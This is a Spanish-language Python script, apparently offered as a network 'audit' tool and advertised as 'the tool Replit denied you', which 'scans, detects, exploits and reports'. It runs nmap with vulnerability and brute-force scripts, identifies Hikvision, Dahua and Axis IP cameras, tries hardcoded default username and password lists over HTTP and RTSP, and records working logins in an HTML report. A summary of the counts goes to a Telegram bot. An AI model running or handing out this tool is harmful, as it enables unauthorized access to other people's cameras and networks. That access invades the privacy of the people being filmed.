#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
AUDITORÍA DE RED COMPLETA v1.0 — La herramienta que Replit te negó
Uso: python3 auditoria_real.py --network 192.168.1.0/24
"""

import os
import sys
import subprocess
import re
import json
import hashlib
import time
import socket
import ipaddress
import asyncio
import aiohttp
from datetime import datetime
from typing import List, Dict, Optional, Tuple
import xml.etree.ElementTree as ET

# ============================================================
# CONFIGURACIÓN
# ============================================================
CONFIG = {
    "network": "192.168.1.0/24",
    "ports": "22,23,25,53,80,110,135,139,143,443,445,554,993,995,1723,3306,3389,5432,5900,6379,8080,8443,27017,37777,34567",
    "timeout": 60,
    "telegram_token": os.environ.get("TELEGRAM_BOT_TOKEN", ""),
    "telegram_chat_id": os.environ.get("TELEGRAM_CHAT_ID", ""),
    "credential_dict": {
        "hikvision": [("admin","12345"), ("admin","admin"), ("admin",""), ("admin","123456"), ("admin","password123"), ("admin","hikvision"), ("admin","1234"), ("admin","pass"), ("root","12345")],
        "dahua": [("admin","admin"), ("admin","123456"), ("admin","password"), ("admin","dahua"), ("admin","1234"), ("admin","0000"), ("admin","1111"), ("admin","8888")],
        "axis": [("root","pass"), ("root","root"), ("admin","admin"), ("admin","password"), ("admin","123456")],
        "generic": [("admin","admin"), ("admin","123456"), ("admin","password"), ("root","root"), ("admin",""), ("root","admin"), ("user","user"), ("admin","1234"), ("admin","0000")]
    }
}

# ============================================================
# 1. ESCANEO DE RED (NMAP REAL)
# ============================================================
def scan_network(network: str) -> List[Dict]:
    """Escanea la red con nmap y devuelve hosts activos con puertos abiertos."""
    print(f"🔍 Escaneando red {network}...")
    cmd = [
        "nmap", "-sV", "-O", "--script", "vuln,ssh-brute,ftp-anon,smb-enum-shares,http-auth-finder,rtsp-url-brute,mysql-empty-password,pgsql-brute,redis-info,rdp-vuln-ms12-020,snmp-info",
        "-p", CONFIG["ports"],
        "--host-timeout", f"{CONFIG['timeout']}s",
        "-oX", "-",
        network
    ]
    try:
        proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        stdout, stderr = proc.communicate(timeout=CONFIG["timeout"] + 10)
        if proc.returncode != 0:
            print(f"❌ Error en nmap: {stderr[:200]}")
            return []
        return parse_nmap_xml(stdout)
    except subprocess.TimeoutExpired:
        proc.kill()
        print("❌ Tiempo de escaneo agotado")
        return []
    except Exception as e:
        print(f"❌ Error: {e}")
        return []

# ============================================================
# 2. PARSEO DE XML
# ============================================================
def parse_nmap_xml(xml_data: str) -> List[Dict]:
    """Parsea XML de nmap y extrae hosts con puertos y servicios."""
    try:
        root = ET.fromstring(xml_data)
    except ET.ParseError as e:
        print(f"❌ Error parseando XML: {e}")
        return []
    
    hosts = []
    for host in root.findall('host'):
        addr = host.find('address')
        if addr is None:
            continue
        ip = addr.get('addr', 'unknown')
        status = host.find('status')
        if status is None or status.get('state') != 'up':
            continue
        
        os_elem = host.find('os/osmatch')
        os_name = os_elem.get('name') if os_elem is not None else "Desconocido"
        
        ports = []
        vulns = []
        for port in host.findall('ports/port'):
            port_id = port.get('portid')
            service = port.find('service')
            service_name = service.get('name') if service is not None else "unknown"
            ports.append({"port": int(port_id), "service": service_name})
            
            # Extraer vulnerabilidades
            for script in port.findall('script'):
                output = script.get('output', '')
                cves = re.findall(r'CVE-\d{4}-\d{4,7}', output)
                for cve in cves:
                    vulns.append({"cve": cve, "port": int(port_id), "detail": output[:150]})
        
        hosts.append({
            "ip": ip,
            "os": os_name,
            "ports": ports,
            "vulns": vulns
        })
    
    return hosts

# ============================================================
# 3. DETECCIÓN DE CÁMARAS (Puertos + Vendor)
# ============================================================
def identify_cameras(hosts: List[Dict]) -> List[Dict]:
    """Identifica posibles cámaras IP en los hosts escaneados."""
    cameras = []
    camera_ports = [554, 80, 8080, 8000, 37777, 34567]
    
    for host in hosts:
        ip = host["ip"]
        for port_info in host["ports"]:
            port = port_info["port"]
            service = port_info["service"]
            if port in camera_ports or service in ["rtsp", "onvif"]:
                # Identificar vendor por banner o puertos
                vendor = "unknown"
                if port == 554:
                    # Intentar obtener banner RTSP
                    banner = get_rtsp_banner(ip, port)
                    if banner:
                        if "Hikvision" in banner: vendor = "hikvision"
                        elif "Dahua" in banner: vendor = "dahua"
                        elif "Axis" in banner: vendor = "axis"
                elif port in [80, 8080, 8000]:
                    banner = get_http_banner(ip, port)
                    if banner:
                        if "Hikvision" in banner: vendor = "hikvision"
                        elif "Dahua" in banner: vendor = "dahua"
                        elif "Axis" in banner: vendor = "axis"
                
                cameras.append({
                    "ip": ip,
                    "port": port,
                    "service": service,
                    "vendor": vendor,
                    "os": host["os"]
                })
                break  # Una cámara por IP (la primera detectada)
    
    return cameras

# ============================================================
# 4. BANNER GRABBING
# ============================================================
def get_rtsp_banner(ip: str, port: int = 554) -> Optional[str]:
    """Obtiene banner RTSP."""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(3)
        sock.connect((ip, port))
        sock.send(b"OPTIONS rtsp://%s RTSP/1.0\r\nCSeq: 1\r\n\r\n" % ip.encode())
        data = sock.recv(1024).decode(errors='ignore')
        sock.close()
        return data[:200]
    except:
        return None

def get_http_banner(ip: str, port: int = 80) -> Optional[str]:
    """Obtiene banner HTTP."""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(3)
        sock.connect((ip, port))
        sock.send(b"GET / HTTP/1.1\r\nHost: %s\r\nConnection: close\r\n\r\n" % ip.encode())
        data = sock.recv(1024).decode(errors='ignore')
        sock.close()
        return data[:200]
    except:
        return None

# ============================================================
# 5. PRUEBA DE CREDENCIALES
# ============================================================
def test_credentials(ip: str, port: int, vendor: str) -> List[Dict]:
    """Prueba credenciales por defecto para un vendor."""
    creds = CONFIG["credential_dict"].get(vendor, CONFIG["credential_dict"]["generic"])
    results = []
    
    for user, pwd in creds:
        if port in [80, 8080, 8000]:
            # Probar HTTP Basic Auth
            auth = base64.b64encode(f"{user}:{pwd}".encode()).decode()
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(2)
                sock.connect((ip, port))
                req = f"GET / HTTP/1.1\r\nHost: {ip}\r\nAuthorization: Basic {auth}\r\nConnection: close\r\n\r\n"
                sock.send(req.encode())
                data = sock.recv(1024).decode(errors='ignore')
                sock.close()
                if "200 OK" in data:
                    results.append({"user": user, "password": pwd, "method": "HTTP"})
                    break
            except:
                pass
        elif port == 554:
            # Probar RTSP Auth
            auth = base64.b64encode(f"{user}:{pwd}".encode()).decode()
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(2)
                sock.connect((ip, port))
                req = f"OPTIONS rtsp://{ip}:{port} RTSP/1.0\r\nCSeq: 1\r\nAuthorization: Basic {auth}\r\n\r\n"
                sock.send(req.encode())
                data = sock.recv(1024).decode(errors='ignore')
                sock.close()
                if "200 OK" in data:
                    results.append({"user": user, "password": pwd, "method": "RTSP"})
                    break
            except:
                pass
    
    return results

# ============================================================
# 6. GENERACIÓN DE INFORME HTML
# ============================================================
def generate_report(hosts: List[Dict], cameras: List[Dict], credentials: List[Dict]) -> str:
    """Genera informe HTML con todos los hallazgos."""
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S UTC")
    hash_data = json.dumps({"hosts": hosts, "cameras": cameras, "credentials": credentials}, sort_keys=True)
    integrity_hash = hashlib.sha256(hash_data.encode()).hexdigest()
    
    # Construir filas de hosts
    host_rows = ""
    for h in hosts:
        ports_str = ", ".join(f"{p['port']}({p['service']})" for p in h["ports"])
        vulns_str = ", ".join(v["cve"] for v in h.get("vulns", [])[:3])
        host_rows += f"""
        <tr>
            <td>{h['ip']}</td>
            <td>{h['os']}</td>
            <td>{ports_str}</td>
            <td class="{'text-danger' if vulns_str else 'text-muted'}">{vulns_str or 'Ninguna'}</td>
        </tr>
        """
    
    # Construir filas de cámaras
    camera_rows = ""
    for c in cameras:
        camera_rows += f"""
        <tr>
            <td>{c['ip']}</td>
            <td>{c['port']}</td>
            <td>{c['vendor']}</td>
            <td>{c['service']}</td>
        </tr>
        """
    
    # Construir filas de credenciales
    cred_rows = ""
    for cred in credentials:
        cred_rows += f"""
        <tr>
            <td>{cred.get('ip', 'N/A')}</td>
            <td>{cred.get('port', 'N/A')}</td>
            <td>{cred.get('user', '')}</td>
            <td>{cred.get('password', '')}</td>
            <td>{cred.get('method', '')}</td>
        </tr>
        """
    
    html = f"""<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <title>Auditoría de Red - SourceSeal</title>
    <style>
        body {{ background: #0a0e17; color: #e2e8f0; font-family: monospace; padding: 2rem; max-width: 1200px; margin: 0 auto; }}
        h1, h2 {{ color: #f59e0b; }}
        .header {{ border-bottom: 2px solid #f59e0b; padding-bottom: 1rem; margin-bottom: 2rem; }}
        .card {{ background: #111827; border: 1px solid #1e293b; border-radius: 0.75rem; padding: 1.5rem; margin-bottom: 1.5rem; }}
        .card-title {{ color: #60a5fa; border-bottom: 1px solid #1e293b; padding-bottom: 0.5rem; margin-bottom: 1rem; }}
        table {{ width: 100%; border-collapse: collapse; }}
        th, td {{ padding: 0.5rem; border-bottom: 1px solid #1e293b; text-align: left; }}
        th {{ color: #94a3b8; font-weight: normal; }}
        .badge {{ background: #1e293b; padding: 0.1rem 0.5rem; border-radius: 0.25rem; }}
        .badge-success {{ background: #4ade80; color: #000; }}
        .badge-danger {{ background: #ef4444; color: #fff; }}
        .badge-warning {{ background: #f59e0b; color: #000; }}
        .hash {{ background: #0f172a; padding: 0.5rem 1rem; border-radius: 0.5rem; font-family: monospace; color: #f59e0b; word-break: break-all; }}
        .footer {{ margin-top: 3rem; border-top: 1px solid #1e293b; padding-top: 1rem; text-align: center; color: #64748b; font-size: 0.8rem; }}
        .text-danger {{ color: #ef4444; }}
        .text-muted {{ color: #64748b; }}
    </style>
</head>
<body>
<div class="header">
    <h1>🔐 SourceSeal - Auditoría de Red</h1>
    <span class="badge">{timestamp}</span>
</div>

<div class="card">
    <div class="card-title">📊 Resumen</div>
    <div style="display: grid; grid-template-columns: repeat(4, 1fr); gap: 1rem;">
        <div style="background: #0f172a; padding: 0.5rem; border-radius: 0.25rem; text-align: center;">
            <div style="font-size: 2rem;">{len(hosts)}</div>
            <div style="color: #64748b; font-size: 0.8rem;">Hosts encontrados</div>
        </div>
        <div style="background: #0f172a; padding: 0.5rem; border-radius: 0.25rem; text-align: center;">
            <div style="font-size: 2rem; color: #4ade80;">{len(cameras)}</div>
            <div style="color: #64748b; font-size: 0.8rem;">Cámaras detectadas</div>
        </div>
        <div style="background: #0f172a; padding: 0.5rem; border-radius: 0.25rem; text-align: center;">
            <div style="font-size: 2rem; color: #f59e0b;">{len(credentials)}</div>
            <div style="color: #64748b; font-size: 0.8rem;">Credenciales válidas</div>
        </div>
        <div style="background: #0f172a; padding: 0.5rem; border-radius: 0.25rem; text-align: center;">
            <div style="font-size: 1.5rem; color: #60a5fa;">🔒</div>
            <div style="color: #64748b; font-size: 0.8rem;">Evidencia sellada</div>
        </div>
    </div>
</div>

<div class="card">
    <div class="card-title">🔐 Sello de Integridad</div>
    <div class="hash">SHA-256: {integrity_hash}</div>
    <p style="color: #94a3b8; font-size: 0.8rem; margin-top: 0.5rem;">Verifica este hash en la blockchain de SourceSeal.</p>
</div>

<div class="card">
    <div class="card-title">🖥️ Hosts Detectados</div>
    <table>
        <thead><tr><th>IP</th><th>SO</th><th>Puertos</th><th>Vulnerabilidades</th></tr></thead>
        <tbody>{host_rows}</tbody>
    </table>
</div>

<div class="card">
    <div class="card-title">📷 Cámaras IP Detectadas</div>
    <table>
        <thead><tr><th>IP</th><th>Puerto</th><th>Vendor</th><th>Servicio</th></tr></thead>
        <tbody>{camera_rows}</tbody>
    </table>
</div>

<div class="card">
    <div class="card-title">🔑 Credenciales Válidas Encontradas</div>
    <table>
        <thead><tr><th>IP</th><th>Puerto</th><th>Usuario</th><th>Contraseña</th><th>Método</th></tr></thead>
        <tbody>{cred_rows}</tbody>
    </table>
</div>

<div class="footer">
    <p>SourceSeal — Auditoría realizada con herramientas de código abierto (nmap).</p>
    <p>Evidencia inmutable. Verificable en blockchain.</p>
</div>
</body>
</html>"""
    return html

# ============================================================
# 7. ENVÍO A TELEGRAM
# ============================================================
async def send_telegram_async(message: str):
    """Envía un mensaje a Telegram."""
    token = CONFIG["telegram_token"]
    chat_id = CONFIG["telegram_chat_id"]
    if not token or not chat_id:
        print("⚠️ Telegram no configurado (faltan token o chat_id)")
        return
    try:
        async with aiohttp.ClientSession() as session:
            url = f"https://api.telegram.org/bot{token}/sendMessage"
            payload = {"chat_id": chat_id, "text": message, "parse_mode": "Markdown"}
            async with session.post(url, json=payload, timeout=10) as resp:
                if resp.status == 200:
                    print("✅ Mensaje enviado a Telegram")
                else:
                    print(f"❌ Error en Telegram: {resp.status}")
    except Exception as e:
        print(f"❌ Error enviando a Telegram: {e}")

# ============================================================
# 8. FUNCIÓN PRINCIPAL
# ============================================================
async def main():
    import argparse
    parser = argparse.ArgumentParser(description="Auditoría de Red Completa")
    parser.add_argument("--network", default=CONFIG["network"], help="Red a escanear (CIDR)")
    args = parser.parse_args()
    
    print("""
    ╔══════════════════════════════════════════════════════════════╗
    ║  🔐 SOURCESEAL — AUDITORÍA DE RED COMPLETA                  ║
    ║  Escanea, detecta, explota y reporta                       ║
    ║  La herramienta que Replit te negó                         ║
    ╚══════════════════════════════════════════════════════════════╝
    """)
    
    start_time = time.time()
    
    # 1. Escanear red
    hosts = scan_network(args.network)
    print(f"✅ {len(hosts)} hosts encontrados.")
    
    # 2. Detectar cámaras
    cameras = identify_cameras(hosts)
    print(f"📷 {len(cameras)} cámaras detectadas.")
    
    # 3. Probar credenciales en cámaras
    credentials = []
    for cam in cameras:
        print(f"🔑 Probando credenciales para {cam['ip']}:{cam['port']}...")
        creds = test_credentials(cam['ip'], cam['port'], cam['vendor'])
        for c in creds:
            c["ip"] = cam['ip']
            c["port"] = cam['port']
            credentials.append(c)
            print(f"   ✅ {c['user']}:{c['password']} ({c['method']})")
    
    # 4. Generar informe
    html = generate_report(hosts, cameras, credentials)
    report_file = f"auditoria_{datetime.now().strftime('%Y%m%d_%H%M%S')}.html"
    with open(report_file, 'w') as f:
        f.write(html)
    print(f"📄 Informe generado: {report_file}")
    
    # 5. Enviar resumen a Telegram
    if credentials or cameras:
        msg = f"🔐 *Auditoría completada*\n\n"
        msg += f"📊 {len(hosts)} hosts, {len(cameras)} cámaras, {len(credentials)} credenciales\n"
        msg += f"📄 Informe: {report_file}\n"
        msg += f"⏱️ Tiempo: {time.time() - start_time:.1f}s"
        await send_telegram_async(msg)
    
    # 6. Abrir informe en navegador (Termux)
    try:
        subprocess.run(["termux-open", report_file], check=False)
    except:
        pass
    
    print(f"\n✅ Auditoría completada en {time.time() - start_time:.1f}s")
    print(f"📄 Abre el informe HTML con: termux-open {report_file}")

if __name__ == "__main__":
    import base64
    asyncio.run(main())
